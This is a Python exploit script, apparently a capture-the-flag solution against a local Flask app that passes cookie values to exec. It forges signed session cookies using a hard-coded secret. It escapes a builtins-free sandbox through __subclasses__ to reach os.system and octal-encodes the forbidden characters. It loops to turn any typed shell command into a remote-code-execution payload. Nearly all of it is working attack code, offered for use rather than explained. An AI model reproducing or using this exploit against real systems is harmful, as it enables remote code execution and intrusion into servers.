# written in python3
# where url = clone of /debug directory
# 1. The vulnerability is inside the cookie which needs to be signed by the key: ‘eA2b8A2eA1EADa7b2eCbea7e3dAd1e’
# 2. The vulnerability will execute via python method “exec” whatever is inside the resulting format of: recipe = '%s = %s' % (ingredient, measurements) 
#   1) Notice that ingredient and measurments are parameters of the cookie
# 3. both parameters need to have some content
# 4. These characters are forbidden: '['   '('    '_'    '.'
# 5. Max length of payload is 305
# 6. '__builtins__'= None (So no __builtins__)
# 7. You need to use the legacy cookie because the server doesnt accept the current one
# To bypass restricted characters use hex encoding for thoes values
# =========================================================
import os
from flask import Flask, session
from flask.sessions import SecureCookieSessionInterface

secret = 'eA2b8A2eA1EADa7b2eCbea7e3dAd1e'
url = 'http://127.0.0.1:1337'
app = Flask("__main__", template_folder='./')
app.secret_key = secret
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

builtinbypass = '().__class__.__base__.__subclasses__()[59]()._module.__builtins__["__import__"]("os").system("%s")'

def encode(text):
    str = ""
    for c in text:
        if c in ['[','(', '_', '.']: #restricted characters 
            if c is '_':
                str += '\\137' 
            elif c is '[':
                str += '\\133'
            else:
                str += "\\" + (oct(ord(c)))
        else:
            str += c
    return str

while 1:
    ingredients = "test"
    underscore = "\\137"
    rce = raw_input("command: ")
    measurements = '1;exec \'' + encode(builtinbypass % rce) + '\''
    print (measurements)
    print (session_serializer.dumps({'ingredient': ingredients, 'measurements': measurements}))
